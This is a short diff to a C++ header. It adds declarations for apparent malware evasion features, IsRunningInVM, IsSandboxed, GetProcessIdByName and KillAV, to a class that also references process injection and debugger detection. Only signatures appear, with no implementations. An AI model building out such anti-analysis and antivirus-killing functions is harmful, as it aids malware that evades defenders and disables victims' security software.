@@ -4,7 +4,6 @@
 
 #include "Executable.h"
 #include "Injection.h"
-#include <winternl.h>
 
 class HandleGuard;
 
@@ -24,4 +23,8 @@ public:
 	Executable process;
 	BOOL isBeingDebugging(void);
 	BOOL isDomainReachable(void);
+	BOOL IsRunningInVM();
+	DWORD GetProcessIdByName(const std::string& processName);
+	BOOL IsSandboxed();
+	VOID KillAV();
 };
